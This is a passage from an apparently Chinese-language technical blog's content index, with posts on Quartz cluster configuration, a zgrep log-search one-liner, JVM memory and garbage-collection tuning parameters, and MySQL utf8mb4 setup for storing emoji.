class="line"></span><br><span class="line">    <span class="comment">&lt;!-- reference to our &#x27;autowiring job factory bean&#x27;, defined above: --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jobFactory&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;quartzJobFactory&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Boolean controlling whether you want to override the job definitions in the DB on the app start up. We&#x27;ll talk about it more in the next section. --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;overwriteExistingJobs&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- I will not explain the next three properties, just use it as shown: --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;autoStartup&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 需要保证每个目的的设置为不同的schedulerName --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;schedulerName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;RobotQuartzScheduler&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;applicationContextSchedulerContextKey&quot;</span> <span class="attr">value</span>=<span class="string">&quot;applicationContext&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Controls whether to wait for jobs completion on app shutdown, we use &#x27;true&#x27; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;waitForJobsToCompleteOnShutdown&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line"><span class="comment"># Configure Main Scheduler Properties</span></span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line">org.quartz.scheduler.instanceName=RobotQuartzScheduler</span><br><span class="line">org.quartz.scheduler.instanceId=AUTO</span><br><span class="line">org.quartz.scheduler.skipUpdateCheck=<span class="literal">true</span></span><br><span class="line">org.quartz.scheduler.misfirePolicy=doNothing</span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line"><span class="comment"># Configure ThreadPool</span></span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line">org.quartz.threadPool.<span class="keyword">class</span>:org.quartz.simpl.SimpleThreadPool</span><br><span class="line">org.quartz.threadPool.threadCount:<span class="number">5</span></span><br><span class="line">org.quartz.threadPool.threadPriority:<span class="number">5</span></span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line"><span class="comment"># Configure JobStore</span></span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line">org.quartz.jobStore.misfireThreshold=<span class="number">60000</span></span><br><span class="line"><span class="comment"># Quartz的集群模式需要设置数据库，所以jobStore设置为有jdbc的</span></span><br><span class="line">org.quartz.jobStore.<span class="keyword">class</span>=org.quartz.impl.jdbcjobstore.JobStoreTX</span><br><span class="line">org.quartz.jobStore.driverDelegateClass=org.quartz.impl.jdbcjobstore.StdJDBCDelegate</span><br><span class="line">org.quartz.jobStore.useProperties=<span class="literal">false</span></span><br><span class="line">org.quartz.jobStore.dataSource=mysql</span><br><span class="line">org.quartz.jobStore.tablePrefix=QRTZ_</span><br><span class="line">org.quartz.jobStore.isClustered=<span class="literal">true</span></span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line"><span class="comment"># Configure Datasources</span></span><br><span class="line"><span class="comment">#============================================================================</span></span><br><span class="line">org.quartz.dataSource.mysql.driver:com.mysql.jdbc.Driver</span><br><span class="line">org.quartz.dataSource.mysql.URL:jdbc:mysql:<span class="comment">//db.pp.net:3306/quartz?useUnicode=true&amp;characterEncoding=utf-8</span></span><br><span class="line">org.quartz.dataSource.mysql.user:root</span><br><span class="line">org.quartz.dataSource.mysql.password:</span><br><span class="line">org.quartz.dataSource.mysql.maxConnections:<span class="number">5</span></span><br><span class="line">org.quartz.dataSource.mysql.validationQuery:select <span class="number">0</span></span><br></pre></td></tr></table></figure><p>Quartz需要初始化数据库表，查看的Github中的初始化代码 <a href="https://github.com/elventear/quartz-scheduler/blob/master/distribution/src/main/assembly/root/docs/dbTables/tables_mysql.sql">tables_mysql.sql</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Quartz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么zgrep</title>
      <link href="/2016/08/18/%E4%B8%BA%E4%BB%80%E4%B9%88zgrep/"/>
      <url>/2016/08/18/%E4%B8%BA%E4%BB%80%E4%B9%88zgrep/</url>
      
        <content type="html"><![CDATA[<p>真不知道选一个什么样的域名，最后想了一个自己比较常用的一条命令，于是变成了<code>zgrep.me</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find logs/ -name <span class="string">&#x27;cashier.2016*&#x27;</span> -<span class="built_in">type</span> f | xargs zgrep <span class="string">&#x27;ERROR&#x27;</span> | grep <span class="string">&#x27;failed&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GC策略&amp;内存申请、对象衰老</title>
      <link href="/2016/08/10/GC%E7%AD%96%E7%95%A5&amp;%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E3%80%81%E5%AF%B9%E8%B1%A1%E8%A1%B0%E8%80%81/"/>
      <url>/2016/08/10/GC%E7%AD%96%E7%95%A5&amp;%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E3%80%81%E5%AF%B9%E8%B1%A1%E8%A1%B0%E8%80%81/</url>
      
        <content type="html"><![CDATA[<h4 id="堆内存-GC"><a href="#堆内存-GC" class="headerlink" title="堆内存 GC"></a>堆内存 GC</h4><p>JVM(采用分代回收的策略)，用较高的频率对年轻的对象(young generation)进行 YGC，而对老对象(tenured generation)较少(tenured generation 满了后才进行)进行 Full GC。这样就不需要每次 GC 都将内存中所有对象都检查一遍。</p><h4 id="非堆内存不-GC"><a href="#非堆内存不-GC" class="headerlink" title="非堆内存不 GC"></a>非堆内存不 GC</h4><p>GC 不会在主程序运行期对 PermGen Space 进行清理，所以如果你的应用中有很多 CLASS(特别是动态生成类，当然 permgen space 存放的内容不仅限于类)的话,就很可能出现 PermGen Space 错误。</p><h4 id="对象衰老过程"><a href="#对象衰老过程" class="headerlink" title="对象衰老过程"></a>对象衰老过程</h4><p>新创建的对象的内存都分配自 eden。Minor collection 的过程就是将 eden 和在用 survivor space 中的活对象 copy 到空闲 survivor space 中。对象在 young generation 里经历了一定次数(可以通过参数配置)的 minor collection 后，就会被移到 old generation 中，称为 tenuring。</p><span id="more"></span><h4 id="内存申请、对象衰老过程"><a href="#内存申请、对象衰老过程" class="headerlink" title="内存申请、对象衰老过程"></a>内存申请、对象衰老过程</h4><h5 id="内存申请过程"><a href="#内存申请过程" class="headerlink" title="内存申请过程"></a>内存申请过程</h5><ol><li>JVM 会试图为相关 Java 对象在 Eden 中初始化一块内存区域；</li><li>当 Eden 空间足够时，内存申请结束。否则到下一步；</li><li>JVM 试图释放在 Eden 中所有不活跃的对象（minor collection），释放后若 Eden 空间仍然不足以放入新对象，则试图将部分 Eden 中活跃对象放入 Survivor 区；</li><li>Survivor 区被用来作为 Eden 及 old 的中间交换区域，当 OLD 区空间足够时，Survivor 区的对象会被移到 Old 区，否则会被保留在 Survivor 区；</li><li>当 old 区空间不够时，JVM 会在 old 区进行 major collection；</li><li>完全垃圾收集后，若 Survivor 及 old 区仍然无法存放从 Eden 复制过来的部分对象，导致 JVM 无法在 Eden 区为新对象创建内存区域，则出现”Out of memory 错误”；</li><li>新创建的对象的内存都分配自 eden。Minor collection 的过程就是将 eden 和在用 survivor space 中的活对象 copy 到空闲 survivor space 中。对象在 young generation 里经历了一定次数(可以通过参数配置)的 minor collection 后，就会被移到 old generation 中，称为 tenuring。</li></ol><h5 id="GC-触发条件"><a href="#GC-触发条件" class="headerlink" title="GC 触发条件"></a>GC 触发条件</h5><table><thead><tr><th>GC 类型</th><th>触发条件</th><th>触发时发生了什么</th><th>注意</th><th>查看方式</th></tr></thead><tbody><tr><td>YGC</td><td>eden 空间不足</td><td>清空 Eden+from survivor 中所有 no ref 的对象占用的内存 <br />将 eden+from survivor 中所有存活的对象 copy 到 to survivor 中 <br />一些对象将晋升到 old 中: <br /> to survivor 放不下的 <br /> 存活次数超过 turning threshold 中的 <br />重新计算 tenuring threshold(serial parallel GC 会触发此项) <br />重新调整 Eden 和 from 的大小(parallel GC 会触发此项) <br /></td><td>全过程暂停应用 <br />是否为多线程处理由具体的 GC 决定</td><td>jstat –gcutil gc log</td></tr><tr><td>FGC</td><td>old 空间不足 <br />perm 空间不足 <br />显示调用 System.GC, RMI 等的定时触发 <br />YGC 时的悲观策略 <br />dump live 的内存信息时(jmap –dump:live) <br /></td><td>清空 heap 中 no ref 的对象 <br />permgen 中已经被卸载的 classloader 中加载的 class 信息 <br />如配置了 CollectGenOFirst,则先触发 YGC(针对 serial GC) <br />如配置了 ScavengeBeforeFullGC,则先触发 YGC(针对 serial GC)</td><td>全过程暂停应用 <br />是否为多线程处理由具体的 GC 决定 <br />是否压缩需要看配置的具体 GC</td><td>jstat –gcutil gc log</td></tr></tbody></table><p>permanent generation 空间不足会引发 Full GC,仍然不够会引发 PermGen Space 错误。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM内存组成及分配</title>
      <link href="/2016/08/10/JVM%E5%86%85%E5%AD%98%E7%BB%84%E6%88%90%E5%8F%8A%E5%88%86%E9%85%8D/"/>
      <url>/2016/08/10/JVM%E5%86%85%E5%AD%98%E7%BB%84%E6%88%90%E5%8F%8A%E5%88%86%E9%85%8D/</url>
      
        <content type="html"><![CDATA[<p>java 内存组成介绍：堆(Heap)和非堆(Non-heap)内存</p><blockquote><p>Java 虚拟机具有一个堆，堆是运行时数据区域，所有类实例和数组的内存均从此处分配。堆是在 Java 虚拟机启动时创建的。<br>在 JVM 中堆之外的内存称为非堆内存(Non-heap memory)</p></blockquote><p>可以看出 JVM 主要管理两种类型的内存：堆和非堆。简单来说堆就是 Java 代码可及的内存，是留给开发人员使用的；非堆就是 JVM 留给 自己用的，所以方法区、JVM 内部处理或优化所需的内存(如 JIT 编译后的代码缓存)、每个类结构(如运行时常数池、字段和方法数据)以及方法和构造方法 的代码都在非堆内存中。<br><img src="/assets/images/r_sun-jdk-memory-area1.png"></p><ul><li>方法栈&amp;本地方法栈:<ul><li>线程创建时产生,方法执行时生成栈帧</li></ul></li><li>方法区<ul><li>存储类的元数据信息 常量等</li></ul></li><li>堆<ul><li>java 代码中所有的 new 操作</li></ul></li><li>native Memory(C heap)<ul><li>Direct Bytebuffer JNI Compile GC;</li></ul></li></ul><span id="more"></span><h3 id="堆内存分配"><a href="#堆内存分配" class="headerlink" title="堆内存分配"></a>堆内存分配</h3><p>JVM 初始分配的内存由-Xms 指定，默认是物理内存的 1&#x2F;64；JVM 最大分配的内存由-Xmx 指 定，默认是物理内存的 1&#x2F;4。默认空余堆内存小于 40%时，JVM 就会增大堆直到-Xmx 的最大限制；空余堆内存大于 70%时，JVM 会减少堆直到 -Xms 的最小限制。因此服务器一般设置-Xms、-Xmx 相等以避免在每次 GC 后调整堆的大小。对象的堆内存由称为垃圾回收器的自动内存管理系统回收。</p><p><img src="/assets/images/r_heap1.png"></p><table><thead><tr><th>组成</th><th>详解</th></tr></thead><tbody><tr><td>Young Generation</td><td>即图中的 Eden + From Space + To Space</td></tr><tr><td>Eden</td><td>存放新生的对象</td></tr><tr><td>Survivor Space</td><td>有两个，存放每次垃圾回收后存活的对象</td></tr><tr><td>Old Generation</td><td>Tenured Generation 即图中的 Old Space 主要存放应用程序中生命周期长的存活对象</td></tr></tbody></table><h3 id="非堆内存分配"><a href="#非堆内存分配" class="headerlink" title="非堆内存分配"></a>非堆内存分配</h3><p>JVM 使用-XX:PermSize 设置非堆内存初始值，默认是物理内存的 1&#x2F;64；由 XX:MaxPermSize 设置最大非堆内存的大小，默认是物理内存的 1&#x2F;4。</p><table><thead><tr><th>组成</th><th>详解</th></tr></thead><tbody><tr><td>Permanent Generation</td><td>保存虚拟机自己的静态(refective)数据主要存放加载的 Class 类级别静态对象如 class 本身，method，field 等等 <br/>permanent generation 空间不足会引发 full GC(详见 HotSpot VM GC 种类)</td></tr><tr><td>Code Cache</td><td>用于编译和保存本地代码（native code）的内存 JVM 内部处理或优化</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM参数设置、分析</title>
      <link href="/2016/08/10/JVM%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE%E3%80%81%E5%88%86%E6%9E%90/"/>
      <url>/2016/08/10/JVM%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE%E3%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>不管是 YGC 还是 Full GC,GC 过程中都会对导致程序运行中中断,正确的选择不同的 GC 策略,调整 JVM、GC 的参数，可以极大的减少由于 GC 工作，而导致的程序运行中断方面的问题，进而适当的提高 Java 程序的工作效率。但是调整 GC 是以个极为复杂的过程，由于各个程序具备不同的特点，如：web 和 GUI 程序就有很大区别（Web 可以适当的停顿，但 GUI 停顿是客户无法接受的），而且由于跑在各个机器上的配置不同（主要 cup 个数，内存不同），所以使用的 GC 种类也会不同(如何选择见 GC 种类及如何选择)。本文将注重介绍 JVM、GC 的一些重要参数的设置来提高系统的性能。</p><p>JVM 内存组成及 GC 相关内容请见之前的文章:JVM 内存组成 GC 策略&amp;内存申请。</p><span id="more"></span><h3 id="JVM-参数的含义"><a href="#JVM-参数的含义" class="headerlink" title="JVM 参数的含义"></a>JVM 参数的含义</h3><table><thead><tr><th>参数名称</th><th>含义</th><th>默认值</th><th>备注</th></tr></thead><tbody><tr><td>-Xms</td><td>初始堆大小</td><td>物理内存的 1&#x2F;64(&lt;1GB)</td><td>默认(MinHeapFreeRatio 参数可以调整)空余堆内存小于 40%时，JVM 就会增大堆直到-Xmx 的最大限制.</td></tr><tr><td>-Xmx</td><td>最大堆大小</td><td>物理内存的 1&#x2F;4(&lt;1GB)</td><td>默认(MaxHeapFreeRatio 参数可以调整)空余堆内存大于 70%时，JVM 会减少堆直到 -Xms 的最小限制</td></tr><tr><td>-Xmn</td><td>年轻代大小(1.4or lator)</td><td></td><td>注意：此处的大小是（eden+ 2 survivor space).与 jmap -heap 中显示的 New gen 是不同的。整个堆大小&#x3D;年轻代大小 + 年老代大小 + 持久代大小.增大年轻代后,将会减小年老代大小.此值对系统性能影响较大,Sun 官方推荐配置为整个堆的 3&#x2F;8</td></tr><tr><td>-XX:NewSize</td><td>设置年轻代大小(for 1.3&#x2F;1.4)</td><td></td><td></td></tr><tr><td>-XX:MaxNewSize</td><td>年轻代最大值(for 1.3&#x2F;1.4)</td><td></td><td></td></tr><tr><td>-XX:PermSize</td><td>设置持久代(perm gen)初始值</td><td>物理内存的 1&#x2F;64</td><td></td></tr><tr><td>-XX:MaxPermSize</td><td>设置持久代最大值</td><td>物理内存的 1&#x2F;4</td><td></td></tr><tr><td>-Xss</td><td>每个线程的堆栈大小</td><td></td><td>JDK5.0 以后每个线程堆栈大小为 1M,以前每个线程堆栈大小为 256K.更具应用的线程所需内存大小进行 调整.在相同物理内存下,减小这个值能生成更多的线程.但是操作系统对一个进程内的线程数还是有限制的,不能无限生成,经验值在 3000~5000 左右.一般小的应用， 如果栈不是很深， 应该是 128k 够用的 大的应用建议使用 256k。这个选项对性能影响比较大，需要严格的测试。（校长）和 threadstacksize 选项解释很类似,官方文档似乎没有解释,在论坛中有这样一句话:”” -Xss is translated in a VM flag named ThreadStackSize”一般设置这个值就可以了。-XX:ThreadStackSize Thread Stack Size (0 means use default stack size) [Sparc: 512; Solaris x86: 320 (was 256 prior in 5.0 and earlier); Sparc 64 bit: 1024; Linux amd64: 1024 (was 0 in 5.0 and earlier); all others 0.]</td></tr><tr><td>-XX:NewRatio</td><td>年轻代(包括 Eden 和两个 Survivor 区)与年老代的比值(除去持久代)</td><td></td><td>-XX:NewRatio&#x3D;4 表示年轻代与年老代所占比值为 1:4,年轻代占整个堆栈的 1&#x2F;5 .Xms&#x3D;Xmx 并且设置了 Xmn 的情况下，该参数不需要进行设置。</td></tr><tr><td>-XX:SurvivorRatio</td><td>Eden 区与 Survivor 区的大小比值</td><td></td><td>设置为 8,则两个 Survivor 区与一个 Eden 区的比值为 2:8,一个 Survivor 区占整个年轻代的 1&#x2F;10</td></tr><tr><td>-XX:LargePageSizeInBytes</td><td>内存页的大小不可设置过大， 会影响 Perm 的大小</td><td></td><td>&#x3D;128m</td></tr><tr><td>-XX:+UseFastAccessorMethods</td><td>原始类型的快速优化</td><td></td><td></td></tr><tr><td>-XX:+DisableExplicitGC</td><td>关闭 System.gc()</td><td></td><td>这个参数需要严格的测试</td></tr><tr><td>-XX:MaxTenuringThreshold</td><td>垃圾最大年龄</td><td></td><td>如果设置为 0 的话,则年轻代对象不经过 Survivor 区,直接进入年老代. 对于年老代比较多的应用,可以提高效率.如果将此值设置为一个较大值,则年轻代对象会在 Survivor 区进行多次复制,这样可以增加对象再年轻代的存活 时间,增加在年轻代即被回收的概率该参数只有在串行 GC 时才有效.</td></tr><tr><td>-XX:+AggressiveOpts</td><td>加快编译</td><td></td><td></td></tr><tr><td>-XX:+UseBiasedLocking</td><td>锁机制的性能改善</td><td></td><td></td></tr><tr><td>-Xnoclassgc</td><td>禁用垃圾回收</td><td></td><td></td></tr><tr><td>-XX:SoftRefLRUPolicyMSPerMB</td><td>每兆堆空闲空间中 SoftReference 的存活时间</td><td>1s</td><td>softly reachable objects will remain alive for some amount of time after the last time they were referenced. The default value is one second of lifetime per free megabyte in the heap</td></tr><tr><td>-XX:PretenureSizeThreshold</td><td>对象超过多大是直接在旧生代分配</td><td>0</td><td>单位字节 新生代采用 Parallel Scavenge GC 时无效 另一种直接在旧生代分配的情况是大的数组对象,且数组中无外部引用对象.</td></tr><tr><td>-XX:TLABWasteTargetPercent</td><td>TLAB 占 eden 区的百分比</td><td>1%</td><td></td></tr><tr><td>-XX:+CollectGen0First</td><td>FullGC 时是否先 YGC</td><td>false</td><td></td></tr></tbody></table><h3 id="并行收集器相关参数"><a href="#并行收集器相关参数" class="headerlink" title="并行收集器相关参数"></a>并行收集器相关参数</h3><table><thead><tr><th>参数名称</th><th>含义</th><th>默认值</th><th>备注</th></tr></thead><tbody><tr><td>-XX:+UseParallelGC</td><td>Full GC 采用 parallel MSC(此项待验证)</td><td></td><td>选择垃圾收集器为并行收集器.此配置仅对年轻代有效.即上述配置下,年轻代使用并发收集,而年老代仍旧使用串行收集.(此项待验证)</td></tr><tr><td>-XX:+UseParNewGC</td><td>设置年轻代为并行收集</td><td></td><td>可与 CMS 收集同时使用 JDK5.0 以上,JVM 会根据系统配置自行设置,所以无需再设置此值</td></tr><tr><td>-XX:ParallelGCThreads</td><td>并行收集器的线程数</td><td></td><td>此值最好配置与处理器数目相等 同样适用于 CMS</td></tr><tr><td>-XX:+UseParallelOldGC</td><td>年老代垃圾收集方式为并行收集(Parallel Compacting)</td><td></td><td>这个是 JAVA 6 出现的参数选项</td></tr><tr><td>-XX:MaxGCPauseMillis</td><td>每次年轻代垃圾回收的最长时间(最大暂停时间)</td><td></td><td>如果无法满足此时间,JVM 会自动调整年轻代大小,以满足此值.</td></tr><tr><td>-XX:+UseAdaptiveSizePolicy</td><td>自动选择年轻代区大小和相应的 Survivor 区比例</td><td></td><td>设置此选项后,并行收集器会自动选择年轻代区大小和相应的 Survivor 区比例,以达到目标系统规定的最低相应时间或者收集频率等,此值建议使用并行收集器时,一直打开.</td></tr><tr><td>-XX:GCTimeRatio</td><td>设置垃圾回收时间占程序运行时间的百分比</td><td></td><td>公式为 1&#x2F;(1+n)</td></tr><tr><td>-XX:+ScavengeBeforeFullGC</td><td>Full GC 前调用 YGC</td><td>true</td><td>Do young generation GC prior to a full GC. (Introduced in 1.4.1.)</td></tr></tbody></table><h3 id="CMS-相关参数"><a href="#CMS-相关参数" class="headerlink" title="CMS 相关参数"></a>CMS 相关参数</h3><table><thead><tr><th>参数名称</th><th>含义</th><th>默认值</th><th>备注</th></tr></thead><tbody><tr><td>-XX:+UseConcMarkSweepGC</td><td>使用 CMS 内存收集</td><td></td><td>测试中配置这个以后,-XX:NewRatio&#x3D;4 的配置失效了,原因不明.所以,此时年轻代大小最好用-Xmn 设置.???</td></tr><tr><td>-XX:+AggressiveHeap</td><td></td><td></td><td>试图是使用大量的物理内存长时间大内存使用的优化，能检查计算资源（内存， 处理器数量）至少需要 256MB 内存大量的 CPU／内存， （在 1.4.1 在 4CPU 的机器上已经显示有提升）</td></tr><tr><td>-XX:CMSFullGCsBeforeCompaction</td><td>多少次后进行内存压缩</td><td></td><td>由于并发收集器不对内存空间进行压缩,整理,所以运行一段时间以后会产生”碎片”,使得运行效率降低.此值设置运行多少次 GC 以后对内存空间进行压缩,整理.</td></tr><tr><td>-XX:+CMSParallelRemarkEnabled</td><td>降低标记停顿</td><td></td><td></td></tr><tr><td>-XX+UseCMSCompactAtFullCollection</td><td>在 FULL GC 的时候， 对年老代的压缩</td><td></td><td>CMS 是不会移动内存的， 因此， 这个非常容易产生碎片， 导致内存不够用， 因此， 内存的压缩这个时候就会被启用。 增加这个参数是个好习惯。 可能会影响性能,但是可以消除碎片</td></tr><tr><td>-XX:+UseCMSInitiatingOccupancyOnly</td><td>使用手动定义初始化定义开始 CMS 收集</td><td></td><td>禁止 hostspot 自行触发 CMS GC</td></tr><tr><td>-XX:CMSInitiatingOccupancyFraction&#x3D;70</td><td>使用 cms 作为垃圾回收使用 70％后开始 CMS 收集</td><td>92</td><td>为了保证不出现 promotion failed(见下面介绍)错误,该值的设置需要满足以下公式 CMSInitiatingOccupancyFraction 计算公式</td></tr><tr><td>-XX:CMSInitiatingPermOccupancyFraction</td><td>设置 Perm Gen 使用到达多少比率时触发</td><td>92</td><td></td></tr><tr><td>-XX:+CMSIncrementalMode</td><td>设置为增量模式</td><td></td><td>用于单 CPU 情况</td></tr><tr><td>-XX:+CMSClassUnloadingEnabled</td><td></td><td></td><td></td></tr></tbody></table><h3 id="辅助信息"><a href="#辅助信息" class="headerlink" title="辅助信息"></a>辅助信息</h3><table><thead><tr><th>参数名称</th><th>含义</th><th>默认值</th><th>备注</th></tr></thead><tbody><tr><td>-XX:+PrintGC</td><td></td><td></td><td>输出形式:<br/>[GC 118250K-&gt;113543K(130112K), 0.0094143 secs]<br/>[Full GC 121376K-&gt;10414K(130112K), 0.0650971 secs]</td></tr><tr><td>-XX:+PrintGCDetails</td><td></td><td></td><td>输出形式:<br/>[GC [DefNew: 8614K-&gt;781K(9088K), 0.0123035 secs] 118250K-&gt;113543K(130112K), 0.0124633 secs]<br/>[GC [DefNew: 8614K-&gt;8614K(9088K), 0.0000665 secs][tenured: 112761k-&gt;10414k(121024k), 0.0433488 secs] 121376K-&gt;10414K(130112K), 0.0436268 secs]</td></tr><tr><td>-XX:+PrintGCTimeStamps</td><td></td><td></td><td></td></tr><tr><td>-XX:+PrintGC:PrintGCTimeStamps</td><td></td><td></td><td>可与-XX:+PrintGC -XX:+PrintGCDetails 混合使用输出形式:11.851: [GC 98328K-&gt;93620K(130112K), 0.0082960 secs]</td></tr><tr><td>-XX:+PrintGCApplicationStoppedTime</td><td>打印垃圾回收期间程序暂停的时间.可与上面混合使用</td><td></td><td>输出形式:Total time for which application threads were stopped: 0.0468229 seconds</td></tr><tr><td>-XX:+PrintGCApplicationConcurrentTime</td><td>打印每次垃圾回收前,程序未中断的执行时间.可与上面混合使用</td><td></td><td>输出形式:Application time: 0.5291524 seconds</td></tr><tr><td>-XX:+PrintHeapAtGC</td><td>打印 GC 前后的详细堆栈信息</td><td></td><td></td></tr><tr><td>-Xloggc:filename</td><td>把相关日志信息记录到文件以便分析.与上面几个配合使用</td><td></td><td></td></tr><tr><td>-XX:+PrintClassHistogram</td><td>garbage collects before printing the histogram.</td><td></td><td></td></tr><tr><td>-XX:+PrintTLAB</td><td>查看 TLAB 空间的使用情况</td><td></td><td></td></tr><tr><td>XX:+PrintTenuringDistribution</td><td>查看每次 minor GC 后新的存活周期的阈值</td><td></td><td>Desired survivor size 1048576 bytes, new threshold 7 (max 15) new threshold 7 即标识新的存活周期的阈值为 7。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL 存储 Emoji 表情</title>
      <link href="/2016/08/10/MySQL%E5%AD%98%E5%82%A8emoji%E8%A1%A8%E6%83%85/"/>
      <url>/2016/08/10/MySQL%E5%AD%98%E5%82%A8emoji%E8%A1%A8%E6%83%85/</url>
      
        <content type="html"><![CDATA[<h1 id="编辑-MySQL-配置文件-my-ini"><a href="#编辑-MySQL-配置文件-my-ini" class="headerlink" title="编辑 MySQL 配置文件 my.ini"></a>编辑 MySQL 配置文件 my.ini</h1><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[client]</span></span><br><span class="line"><span class="attr">default-character-set</span> = utf8mb4</span><br><span class="line"></span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="attr">default-character-set</span> = utf8mb4</span><br><span class="line"></span><br><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">character-set-client-handshake</span> = <span class="literal">FALSE</span></span><br><span class="line"><span class="attr">character-set-server</span> = utf8mb4</span><br><span class="line"><span class="attr">collation-server</span> = utf8mb4_unicode_ci</span><br><span class="line"><span class="attr">init_connect</span>=<span class="string">&#x27;SET NAMES utf8mb4&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="重启-MySQL-服务"><a href="#重启-MySQL-服务" class="headerlink" title="重启 MySQL 服务"></a>重启 MySQL 服务</h1><p>重启 MySQL 后 <code>service mysql restart</code> 查询 <code>character</code> &amp; <code>collation</code> 的值</p><h1 id="查询变量是否配置成功"><a href="#查询变量是否配置成功" class="headerlink" title="查询变量是否配置成功"></a>查询变量是否配置成功</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"> show variables <span class="built_in">where</span> variable_name like <span class="string">&#x27;character\_set\_%&#x27;</span> or variable_name like <span class="string">&#x27;collation%&#x27;</span>;</span></span><br><span class="line">+--------------------------+--------------------+</span><br><span class="line">| Variable_name            | Value              |</span><br><span class="line">+--------------------------+--------------------+</span><br><span class="line">| character_set_client     | utf8mb4            |</span><br><span class="line">| character_set_connection | utf8mb4            |</span><br><span class="line">| character_set_database   | utf8mb4            |</span><br><span class="line">| character_set_filesystem | binary             |</span><br><span class="line">| character_set_results    | utf8mb4            |</span><br><span class="line">| character_set_server     | utf8mb4            |</span><br><span class="line">| character_set_system     | utf8               |</span><br><span class="line">| collation_connection     | utf8mb4_unicode_ci |</span><br><span class="line">| collation_database       | utf8mb4_unicode_ci |</span><br><span class="line">| collation_server         | utf8mb4_unicode_ci |</span><br><span class="line">+--------------------------+--------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Database </category>
